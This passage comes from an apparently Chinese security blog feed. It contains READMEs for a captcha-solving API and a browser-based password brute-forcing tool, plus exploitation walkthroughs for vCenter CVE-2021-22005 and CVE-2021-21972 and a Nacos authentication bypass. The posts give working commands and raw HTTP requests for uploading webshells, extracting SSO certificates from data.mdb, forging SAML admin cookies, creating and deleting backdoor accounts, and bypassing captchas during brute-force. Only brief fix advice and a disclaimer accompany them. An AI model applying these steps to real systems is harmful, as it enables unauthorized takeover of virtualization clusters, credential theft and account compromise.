    <content type="html"><![CDATA[<blockquote><p>🚀 一个基于 Python、ddddocr 和 AIOHTTP 的轻量级验证码识别 API 服务，支持算术验证码和多种字符集的通用 OCR 识别。</p></blockquote><hr><h2 id="📌-功能简介"><a href="#📌-功能简介" class="headerlink" title="📌 功能简介"></a>📌 功能简介</h2><ul><li><p>🎯 <strong>多种验证码类型</strong></p><ul><li>算术验证码自动计算（支持 <code>1+2=</code>、<code>4×5=</code> 等）</li><li>数字、字母、大小写混合、多字符集自动识别</li></ul></li><li><p>🧩 <strong>高可用 OCR 引擎</strong></p><ul><li>使用 <a href="https://github.com/sml2h3/ddddocr">ddddocr</a> 提供高效验证码识别</li><li>内置图像预处理（去背景、提取主色、二值化增强）</li></ul></li><li><p>🔐 <strong>简易 Token 认证</strong></p><ul><li>支持 Basic Token，按需授权调用</li></ul></li><li><p>⚡ <strong>可自定义</strong></p><ul><li>基于 AIOHTTP，易于二次开发</li><li>支持多路由切换不同 OCR 识别范围</li></ul></li></ul><hr><h2 id="⚙️-快速开始"><a href="#⚙️-快速开始" class="headerlink" title="⚙️ 快速开始"></a>⚙️ 快速开始</h2><p>项目地址：<a href="https://github.com/gh0stNinja/AutoCaptcha">https://github.com/gh0stNinja/AutoCaptcha</a></p><h3 id="1️⃣-安装依赖"><a href="#1️⃣-安装依赖" class="headerlink" title="1️⃣ 安装依赖"></a>1️⃣ 安装依赖</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pip install ddddocr aiohttp pillow numpy opencv-python scikit-learn<br></code></pre></td></tr></table></figure><h3 id="2️⃣-配置授权密钥"><a href="#2️⃣-配置授权密钥" class="headerlink" title="2️⃣ 配置授权密钥"></a>2️⃣ 配置授权密钥</h3><p>在项目根目录创建 <code>auth_keys.json</code>：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs prolog">&#123;<br>  <span class="hljs-string">&quot;keys&quot;</span>: [<span class="hljs-string">&quot;YOUR_TOKEN_1&quot;</span>, <span class="hljs-string">&quot;YOUR_TOKEN_2&quot;</span>]<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="3️⃣-运行服务"><a href="#3️⃣-运行服务" class="headerlink" title="3️⃣ 运行服务"></a>3️⃣ 运行服务</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python auto_captcha<span class="hljs-selector-class">.py</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-number">58888</span><br></code></pre></td></tr></table></figure><hr><h3 id="4️⃣-使用示例"><a href="#4️⃣-使用示例" class="headerlink" title="4️⃣ 使用示例"></a>4️⃣ 使用示例</h3><p><strong>POST 请求</strong></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">curl</span> -X POST http://localhost:58888/get_captcha \<br>     -H <span class="hljs-string">&quot;Authorization: Basic YOUR_TOKEN_1&quot;</span> \<br>     -d <span class="hljs-string">&quot;<span class="hljs-variable">@base64</span>.txt&quot;</span><br></code></pre></td></tr></table></figure><ul><li><code>get_captcha</code>：算术验证码识别</li><li><code>get_captcha_number</code>：纯数字</li><li><code>get_captcha_letter</code>：小写字母</li><li><code>get_captcha_LETTER</code>：大写字母</li><li><code>get_captcha_LETter</code>：大小写字母</li><li><code>get_captcha_letter_number</code>：字母+数字</li><li><code>get_captcha_LETTER_number</code>：大写字母+数字</li><li><code>get_captcha_LETter_number</code>：大小写字母+数字</li></ul><hr><h2 id="⚙️-路由一览"><a href="#⚙️-路由一览" class="headerlink" title="⚙️ 路由一览"></a>⚙️ 路由一览</h2><table><thead><tr><th>路由</th><th>描述</th></tr></thead><tbody><tr><td><code>/get_captcha</code></td><td>自动识别算术验证码并计算</td></tr><tr><td><code>/get_captcha_number</code></td><td>纯数字验证码</td></tr><tr><td><code>/get_captcha_letter</code></td><td>小写字母验证码</td></tr><tr><td><code>/get_captcha_LETTER</code></td><td>大写字母验证码</td></tr><tr><td><code>/get_captcha_LETter</code></td><td>大小写字母混合</td></tr><tr><td><code>/get_captcha_letter_number</code></td><td>字母+数字混合</td></tr><tr><td><code>/get_captcha_LETTER_number</code></td><td>大写字母+数字</td></tr><tr><td><code>/get_captcha_LETter_number</code></td><td>大小写字母+数字</td></tr></tbody></table><hr><h2 id="🔒-授权机制"><a href="#🔒-授权机制" class="headerlink" title="🔒 授权机制"></a>🔒 授权机制</h2><ul><li><p>所有请求需携带：</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">Authorization:</span> Basic YOUR_TOKEN<br></code></pre></td></tr></table></figure></li><li><p>后台每隔 60 秒自动重新加载 <code>auth_keys.json</code>。</p></li></ul><hr><h2 id="⚙️-图像预处理逻辑"><a href="#⚙️-图像预处理逻辑" class="headerlink" title="⚙️ 图像预处理逻辑"></a>⚙️ 图像预处理逻辑</h2><ul><li>自动判断背景色 &#x2F; 字色</li><li>自动二值化 &#x2F; 直方图均衡 &#x2F; 高斯模糊</li><li>可自行调整阈值或替换预处理逻辑</li></ul><hr><h2 id="📌-TODO"><a href="#📌-TODO" class="headerlink" title="📌 TODO"></a>📌 TODO</h2><ul><li>支持分布式部署</li><li>支持更多验证码类型（滑块、点选）</li><li>增加前端 Demo 页</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>密码爆破</tag>
      
      <tag>验证码</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一个基于 Python + Selenium 的自动化浏览器弱口令爆破脚本</title>
    <link href="/2025/07/11/%E4%B8%80%E4%B8%AA%E5%9F%BA%E4%BA%8E%20Python%20+%20Selenium%20%E7%9A%84%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8F%E8%A7%88%E5%99%A8%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4%E8%84%9A%E6%9C%AC/"/>
    <url>/2025/07/11/%E4%B8%80%E4%B8%AA%E5%9F%BA%E4%BA%8E%20Python%20+%20Selenium%20%E7%9A%84%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8F%E8%A7%88%E5%99%A8%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4%E8%84%9A%E6%9C%AC/</url>
    
    <content type="html"><![CDATA[<p>🔐 一个基于 Python + Selenium 的自动化浏览器弱口令爆破脚本，集成验证码自动识别（依赖本地 OCR API 服务 <a href="https://github.com/gh0stNinja/AutoCaptcha">AutoCaptcha</a>）。</p><hr><h2 id="📌-功能概述"><a href="#📌-功能概述" class="headerlink" title="📌 功能概述"></a>📌 功能概述</h2><ul><li>使用 <strong>Selenium</strong> 控制 Chrome 或 Firefox 自动化登录表单</li><li>从本地文件批量读取用户名和密码字典进行爆破</li><li>支持自动检测是否存在验证码输入框</li><li>自动截图验证码、调用本地 <code>AutoCaptcha</code> OCR API 进行识别</li><li>自动提交验证码并继续尝试登录</li><li>记录登录成功或失败</li></ul><hr><h2 id="🗂️-项目结构"><a href="#🗂️-项目结构" class="headerlink" title="🗂️ 项目结构"></a>🗂️ 项目结构</h2><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs 1c">AutoBrowserBoom/<br> │<br> ├── boom.py           <span class="hljs-meta"># 主程序</span><br> ├── auth_key.json     <span class="hljs-meta"># 存放 OCR API 授权 key</span><br> ├── username.txt      <span class="hljs-meta"># 用户名字典</span><br> ├── password.txt      <span class="hljs-meta"># 密码字典</span><br> └── README.md         <span class="hljs-meta"># 使用说明</span><br></code></pre></td></tr></table></figure><hr><h2 id="⚙️-使用前准备"><a href="#⚙️-使用前准备" class="headerlink" title="⚙️ 使用前准备"></a>⚙️ 使用前准备</h2><p>项目地址：<a href="https://github.com/gh0stNinja/BrowserBrute">https://github.com/gh0stNinja/BrowserBrute</a></p><ol><li><p><strong>环境依赖</strong>  </p><ul><li>Python 3.x  </li><li><code>selenium</code>  </li><li>Chrome 或 Firefox 驱动  </li><li><code>requests</code>  </li><li>本地运行 <code>AutoCaptcha</code>（验证码识别服务）</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pip install selenium requests<br></code></pre></td></tr></table></figure></li></ol><blockquote><p>📌 Chrome 需安装对应版本的 chromedriver 并放到 PATH。</p></blockquote><ol><li><p><strong>配置 OCR 授权</strong><br> 在项目根目录创建 <code>auth_key.json</code> 文件：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;key&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;你的授权Key&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure></li><li><p><strong>准备字典</strong><br> 在同级目录放 <code>username.txt</code> 和 <code>password.txt</code>，一行一个账号或密码。</p></li></ol><hr><h2 id="🚀-运行脚本"><a href="#🚀-运行脚本" class="headerlink" title="🚀 运行脚本"></a>🚀 运行脚本</h2><ol><li><p>启动 <code>AutoCaptcha</code> 验证码服务：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python AutoCaptcha<span class="hljs-selector-class">.py</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-number">58888</span><br></code></pre></td></tr></table></figure></li><li><p>修改 <code>chrome_try_passwords.py</code> 里：</p><ul><li>登录页面 URL (<code>url</code>)</li><li>XPATH 定位表达式（<code>xpath_input_username</code>、<code>xpath_input_password</code>、<code>xpath_login_button</code>、验证码相关等）</li><li>字典文件名</li></ul></li><li><p>执行：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> boom.<span class="hljs-keyword">py</span><br></code></pre></td></tr></table></figure></li></ol><hr><h2 id="🧩-常见问题"><a href="#🧩-常见问题" class="headerlink" title="🧩 常见问题"></a>🧩 常见问题</h2><ul><li>❓ <strong>Q:</strong> 验证码不准识别怎么办？<br> <strong>A:</strong> 请先调试 <code>AutoCaptcha</code> 的预处理策略，可开启保存临时图片，微调阈值。</li><li>❓ <strong>Q:</strong> 找不到元素怎么办？<br> <strong>A:</strong> 检查页面结构是否动态渲染，必要时加入 <code>time.sleep()</code> 或用显式等待。</li><li>❓ <strong>Q:</strong> 浏览器窗口一闪而过？<br> <strong>A:</strong> 请不要关闭脚本的 <code>browser</code>，或者注释掉自动关闭部分。</li></ul><hr><h2 id="⚠️-声明"><a href="#⚠️-声明" class="headerlink" title="⚠️ 声明"></a>⚠️ 声明</h2><blockquote><p>本项目仅供安全研究与学习交流使用，严禁用于非法用途，使用者需自行承担一切后果！</p></blockquote><hr><h2 id="📚-作者"><a href="#📚-作者" class="headerlink" title="📚 作者"></a>📚 作者</h2><ul><li>Author: gh0stNinja</li><li>Blog: <a href="https://gh0stninja.github.io/">https://gh0stninja.github.io/</a></li></ul><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/photo_2025711121445.gif" alt="photo_2025711121445"></p><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/photo_2025711145110.gif" alt="photo_2025711145110.gif"></p>]]></content>
    
    
    
    <tags>
      
      <tag>密码爆破</tag>
      
      <tag>自动化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>漏洞复现 - VMware vCenter Server 任意文件上传漏洞 (CVE-2021-22005)</title>
    <link href="/2025/03/20/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%20-%20VMware%20vCenter%20Server%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%20(CVE-2021-22005)/"/>
    <url>/2025/03/20/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%20-%20VMware%20vCenter%20Server%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%20(CVE-2021-22005)/</url>
    
    <content type="html"><![CDATA[<h3 id="📌-漏洞描述"><a href="#📌-漏洞描述" class="headerlink" title="📌 漏洞描述"></a>📌 漏洞描述</h3><p>CVE-2021-22005 是 VMware vCenter Server 中存在的一个关键任意文件上传漏洞，攻击者无需认证即可向 vCenter Server 上传任意文件并执行，从而在服务器上远程执行任意代码。  </p><h3 id="🎯-漏洞复现"><a href="#🎯-漏洞复现" class="headerlink" title="🎯 漏洞复现"></a>🎯 漏洞复现</h3><p><strong>EXP 工具地址</strong>：<br><a href="https://github.com/shmilylty/cve-2021-22005-exp">👉 https://github.com/shmilylty/cve-2021-22005-exp</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python exp.py -t http://url<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/image-20250714123408600.png" alt="image-20250714123408600"></p><hr><h2 id="🕵️‍♂️-后续渗透操作详解"><a href="#🕵️‍♂️-后续渗透操作详解" class="headerlink" title="🕵️‍♂️ 后续渗透操作详解"></a>🕵️‍♂️ 后续渗透操作详解</h2><p>成功利用 CVE-2021-22005 漏洞上传 WebShell 并拿到初始权限后，可以通过对 vCenter 的核心文件进行获取和解析，进一步提升权限或伪造合法身份，实现对集群的完全控制。</p><h3 id="🔍-1️⃣-找到-data-mdb-文件位置"><a href="#🔍-1️⃣-找到-data-mdb-文件位置" class="headerlink" title="🔍 1️⃣ 找到 data.mdb 文件位置"></a>🔍 1️⃣ 找到 <code>data.mdb</code> 文件位置</h3><p><code>data.mdb</code> 是 vCenter 中保存身份验证信息（包括 SSO、LDAP 等）的核心数据库文件。拿到它，就相当于拿到了管理员的身份证明材料。</p><p>不同系统下该文件默认存放路径如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">🖥️ Windows: C:/ProgramData/VMware/vCenterServer/data/vmdird/data.mdb<br><br>🐧 Linux:   /storage/db/vmware-vmdir/data.mdb<br></code></pre></td></tr></table></figure><blockquote><p>📌 <strong>Tip</strong>：可通过 WebShell 查找此文件是否存在，并尝试下载。</p></blockquote><h3 id="🗝️-2️⃣-伪造-Cookie"><a href="#🗝️-2️⃣-伪造-Cookie" class="headerlink" title="🗝️ 2️⃣ 伪造 Cookie"></a>🗝️ 2️⃣ 伪造 Cookie</h3><p>拿到 <code>data.mdb</code> 后，下一步是伪造 SAML 票据生成合法的登录 Cookie，以管理员身份接管整个 vCenter 环境。</p><h4 id="✅-方法一：直接下载-data-mdb-到本地解析"><a href="#✅-方法一：直接下载-data-mdb-到本地解析" class="headerlink" title="✅ 方法一：直接下载 data.mdb 到本地解析"></a>✅ 方法一：直接下载 <code>data.mdb</code> 到本地解析</h4><p>工具推荐：<a href="https://github.com/horizon3ai/vcenter_saml_login">horizon3ai&#x2F;vcenter_saml_login</a></p><p>操作示例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python vcenter_saml_login.py -p data.mdb -t 10.7.8.227<br></code></pre></td></tr></table></figure><p>该脚本会解析 <code>data.mdb</code> 并生成可用的 SAML Token，然后帮你直接获取合法 Cookie。</p><h4 id="✅-方法二：目标机器无法下载，可在目标机本地解析"><a href="#✅-方法二：目标机器无法下载，可在目标机本地解析" class="headerlink" title="✅ 方法二：目标机器无法下载，可在目标机本地解析"></a>✅ 方法二：目标机器无法下载，可在目标机本地解析</h4><p>如果目标机器的 <code>data.mdb</code> 文件体积过大、不方便下载，或者网络受限，可以直接在目标主机执行提取脚本。</p><p>推荐工具：</p><ul><li><a href="https://github.com/3gstudent/Homework-of-Python/blob/master/vCenter_ExtraCertFromMdb.py">vCenter_ExtraCertFromMdb.py</a></li></ul><p>使用示例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python vCenter_ExtraCertFromMdb.py data.mdb<br></code></pre></td></tr></table></figure><p>运行后，会从 <code>data.mdb</code> 中提取出：</p><ul><li><code>idp_cert.txt</code></li><li><code>trusted_cert_1.txt</code></li><li><code>trusted_cert_2.txt</code></li></ul><p>即 vCenter 的 SSO 身份验证证书。</p><p>📥 <strong>生成 Cookie</strong></p><p>拿到证书后，将它们下载到本地，再使用下面的脚本生成可用的登录 Cookie：</p><p>脚本地址：<a href="https://github.com/3gstudent/Homework-of-Python/blob/master/vCenter_GenerateLoginCookie.py">vCenter_GenerateLoginCookie.py</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python vCenter_GenerateLoginCookie.py &lt;vcenter_ip&gt; &lt;vcenter_ip&gt; vsphere.local idp_cert.txt trusted_cert_1.txt trusted_cert_2.txt<br></code></pre></td></tr></table></figure><p>示例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python vCenter_GenerateLoginCookie.py 192.168.121.135 192.168.121.135 vsphere.local idp_cert.txt trusted_cert_1.txt trusted_cert_2.txt<br></code></pre></td></tr></table></figure><p>执行后会在控制台输出一个伪造好的 SAML Cookie，粘贴到浏览器即可</p><h3 id="🏰-3️⃣-替换-Cookie-接管集群"><a href="#🏰-3️⃣-替换-Cookie-接管集群" class="headerlink" title="🏰 3️⃣ 替换 Cookie 接管集群"></a>🏰 3️⃣ 替换 Cookie 接管集群</h3><p>把生成的 Cookie 替换到浏览器中已有的 vCenter 会话 Cookie（或通过 Burp Suite 等工具注入），刷新页面，即可绕过密码验证，以管理员身份登录 vCenter 后台，控制整个服务器集群。</p><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/image-20250714123438461.png" alt="image-20250714123438461"></p><h2 id="⚠️-风险提示"><a href="#⚠️-风险提示" class="headerlink" title="⚠️ 风险提示"></a>⚠️ 风险提示</h2><ul><li>此漏洞是未授权远程任意文件上传，结合后渗透可实现<strong>完整接管</strong>，影响极大。</li><li>如果生产环境尚未修复，请立即隔离对外服务，并尽快升级或部署安全防护。</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
      <tag>VMware</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>漏洞复现 - VMware vCenter Server 6.5-7.0 RCE 漏洞(CVE-2021-21972)</title>
    <link href="/2025/03/20/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%20-%20VMware%20vCenter%20Server%206.5-7.0%20RCE%20%E6%BC%8F%E6%B4%9E(CVE-2021-21972)/"/>
    <url>/2025/03/20/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%20-%20VMware%20vCenter%20Server%206.5-7.0%20RCE%20%E6%BC%8F%E6%B4%9E(CVE-2021-21972)/</url>
    
    <content type="html"><![CDATA[<h2 id="🗂️-漏洞描述"><a href="#🗂️-漏洞描述" class="headerlink" title="🗂️ 漏洞描述"></a>🗂️ 漏洞描述</h2><p><strong>CVE-2021-21972</strong> 是 VMware vCenter Server 中一个高危远程代码执行（RCE）漏洞，影响版本包括：</p><ul><li>vCenter Server 6.5、6.7 和 7.0</li><li>该漏洞位于 <code>vRealize Operations Manager（vROps）</code> 插件中，攻击者可通过未授权访问 <code>/ui/vropspluginui/rest/services/uploadova</code> 接口上传恶意文件，最终导致远程命令执行，拿到服务器权限。</li></ul><p>🔥 <strong>危害极大</strong>：攻击者无需身份验证，只要能访问 443 管理端口，就能远程拿下整个 vCenter 甚至虚拟化集群。</p><hr><h2 id="⚙️-漏洞复现"><a href="#⚙️-漏洞复现" class="headerlink" title="⚙️ 漏洞复现"></a>⚙️ 漏洞复现</h2><h3 id="🚩-漏洞利用工具"><a href="#🚩-漏洞利用工具" class="headerlink" title="🚩 漏洞利用工具"></a>🚩 漏洞利用工具</h3><p>开源 PoC 地址 👉 <a href="https://github.com/NS-Sp4ce/CVE-2021-21972"><strong>NS-Sp4ce&#x2F;CVE-2021-21972</strong></a></p><hr><h3 id="📌-复现命令示例"><a href="#📌-复现命令示例" class="headerlink" title="📌 复现命令示例"></a>📌 复现命令示例</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python CVE-2021-21972.py -url 10.7.8.227<br></code></pre></td></tr></table></figure><p>运行后脚本会向目标 <code>/ui/vropspluginui/rest/services/uploadova</code> 接口上传一个恶意 OVA 文件，从而触发远程命令执行。</p><hr><h3 id="✅-成功效果示例"><a href="#✅-成功效果示例" class="headerlink" title="✅ 成功效果示例"></a>✅ 成功效果示例</h3><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/image-20250714123245819.png" alt="image-20250714123245819"></p><p>执行后可获得反弹 shell 或在服务器上直接执行命令，获取 vCenter 权限。</p><hr><h2 id="🕵️‍♂️-后续渗透思路"><a href="#🕵️‍♂️-后续渗透思路" class="headerlink" title="🕵️‍♂️ 后续渗透思路"></a>🕵️‍♂️ 后续渗透思路</h2><ul><li>🧩 <strong>横向移动</strong>：获取到 vCenter 权限后，可访问 ESXi 主机、虚拟机配置文件，执行快照、下载镜像或注入后门。</li><li>🔐 <strong>凭证收集</strong>：搜索管理员口令、配置文件、SSH 私钥等敏感信息。</li><li>📡 <strong>持久化</strong>：可在虚拟化层面植入恶意 VM 模板，实现长时间驻留。</li></ul><hr><h2 id="🔑-修复建议"><a href="#🔑-修复建议" class="headerlink" title="🔑 修复建议"></a>🔑 修复建议</h2><ul><li>🚫 <strong>临时缓解</strong>：未打补丁前，可禁用 vROps 插件，或通过防火墙阻断外部对 <code>/ui</code> 路径的访问。</li><li>✅ <strong>官方补丁</strong>：请立即升级至 VMware 官方已发布的修复版本。</li><li>🔍 <strong>安全检测</strong>：定期审计 vCenter 访问日志，检查是否有异常的 OVA 文件上传记录。</li></ul><hr><h2 id="⚠️-风险提示"><a href="#⚠️-风险提示" class="headerlink" title="⚠️ 风险提示"></a>⚠️ 风险提示</h2><p>💥 该漏洞被多起勒索团伙和挖矿组织大规模利用，务必尽快修补，避免被扫到秒打。</p><hr><blockquote><p>✍️ <strong>参考链接</strong></p><ul><li><a href="https://www.vmware.com/security/advisories/VMSA-2021-0002.html">官方通告</a></li><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-21972">CVE详情</a></li></ul></blockquote>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
      <tag>VMware</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>漏洞复现 - Nacos 未授权创建用户与后门操作</title>
    <link href="/2025/03/20/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%20-%20Nacos%20%E6%9C%AA%E6%8E%88%E6%9D%83%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7%E4%B8%8E%E5%90%8E%E9%97%A8%E6%93%8D%E4%BD%9C/"/>
    <url>/2025/03/20/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%20-%20Nacos%20%E6%9C%AA%E6%8E%88%E6%9D%83%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7%E4%B8%8E%E5%90%8E%E9%97%A8%E6%93%8D%E4%BD%9C/</url>
    
    <content type="html"><![CDATA[<h2 id="📌-漏洞简介"><a href="#📌-漏洞简介" class="headerlink" title="📌 漏洞简介"></a>📌 漏洞简介</h2><p><strong>Nacos</strong> 是阿里巴巴开源的一个动态服务发现、配置管理和服务管理平台。</p><ul><li>在部分版本（或因配置不当），管理端接口对 <code>User-Agent</code> 检测不严格，若请求头伪造为 <code>Nacos-Server</code>，可直接访问部分后端管理 API。</li><li>攻击者可利用该逻辑漏洞：<ul><li><strong>查看用户列表</strong></li><li><strong>创建&#x2F;删除用户</strong></li><li><strong>后门账户登录后台</strong></li><li><strong>横向访问配置</strong></li></ul></li></ul><hr><h2 id="🗂️-漏洞环境"><a href="#🗂️-漏洞环境" class="headerlink" title="🗂️ 漏洞环境"></a>🗂️ 漏洞环境</h2><ul><li>靶机示例：<code>192.168.199.132:8848</code></li><li>访问 Nacos 登录页：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://192.168.199.132:8848/nacos/<span class="hljs-comment">#/login</span><br></code></pre></td></tr></table></figure></li></ul><hr><h2 id="🚩-漏洞利用"><a href="#🚩-漏洞利用" class="headerlink" title="🚩 漏洞利用"></a>🚩 漏洞利用</h2><h3 id="✅-1️⃣-查看用户列表"><a href="#✅-1️⃣-查看用户列表" class="headerlink" title="✅ 1️⃣ 查看用户列表"></a>✅ 1️⃣ 查看用户列表</h3><p>通过伪造请求头 <code>User-Agent: Nacos-Server</code> 调用未授权接口获取全量账户信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">GET /nacos/v1/auth/users/?pageNo=1&amp;pageSize=999 HTTP/1.1<br>Host: 192.168.199.132:8848<br>User-Agent: Nacos-Server<br>Accept: */*<br>Accept-Language: zh-CN,zh;q=0.9<br>Accept-Encoding: gzip<br></code></pre></td></tr></table></figure><p>📌 <strong>访问示例：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://192.168.199.132:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=999<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/image-20250714124456581.png" alt="image-20250714124456581"></p><hr><h3 id="✅-2️⃣-创建后门账户"><a href="#✅-2️⃣-创建后门账户" class="headerlink" title="✅ 2️⃣ 创建后门账户"></a>✅ 2️⃣ 创建后门账户</h3><p>直接调用用户新增接口，默认只要 <code>User-Agent</code> 正确，Nacos 会信任来源。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST /nacos/v1/auth/users HTTP/1.1<br>Host: 192.168.199.132:8848<br>User-Agent: Nacos-Server<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 27<br><br>username=crow&amp;password=crow<br></code></pre></td></tr></table></figure><p>📌 <strong>访问示例：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://192.168.199.132:8848/nacos/v1/auth/users?username=crow&amp;password=crow<br></code></pre></td></tr></table></figure><ul><li>新增账户：<code>crow</code></li><li>密码：<code>crow</code></li></ul><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/image-20250714124514241.png" alt="image-20250714124514241"></p><hr><h3 id="✅-3️⃣-删除账户"><a href="#✅-3️⃣-删除账户" class="headerlink" title="✅ 3️⃣ 删除账户"></a>✅ 3️⃣ 删除账户</h3><p>若需要清理痕迹，可直接用同样的方式删除账户：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">DELETE /nacos/v1/auth/users/?username=crow HTTP/1.1<br>Host: 192.168.199.132:8848<br>User-Agent: Nacos-Server<br>Accept: */*<br>Accept-Language: zh-CN,zh;q=0.9<br>Accept-Encoding: gzip<br></code></pre></td></tr></table></figure><hr><h3 id="✅-4️⃣-使用后门账户登录后台"><a href="#✅-4️⃣-使用后门账户登录后台" class="headerlink" title="✅ 4️⃣ 使用后门账户登录后台"></a>✅ 4️⃣ 使用后门账户登录后台</h3><p>登录地址：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://192.168.199.132:8848/nacos/<span class="hljs-comment">#/login</span><br></code></pre></td></tr></table></figure><p>使用刚创建的账户登录：</p><ul><li>用户名：<code>crow</code></li><li>密码：<code>crow</code></li></ul><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/image-20250714124539444.png" alt="image-20250714124539444"></p><p>至此可完全控制 Nacos 配置和服务注册信息。</p><hr><h2 id="🔍-漏洞危害"><a href="#🔍-漏洞危害" class="headerlink" title="🔍 漏洞危害"></a>🔍 漏洞危害</h2><p>✅ <strong>影响点：</strong></p><ul><li>获取配置中心敏感信息，如数据库连接、Redis 密钥、服务调用密钥等。</li><li>可插入恶意配置，劫持流量。</li><li>横向移动至其他服务。</li></ul><hr><h2 id="🛡️-修复与防护"><a href="#🛡️-修复与防护" class="headerlink" title="🛡️ 修复与防护"></a>🛡️ 修复与防护</h2><p><strong>官方建议：</strong></p><ul><li>升级 Nacos 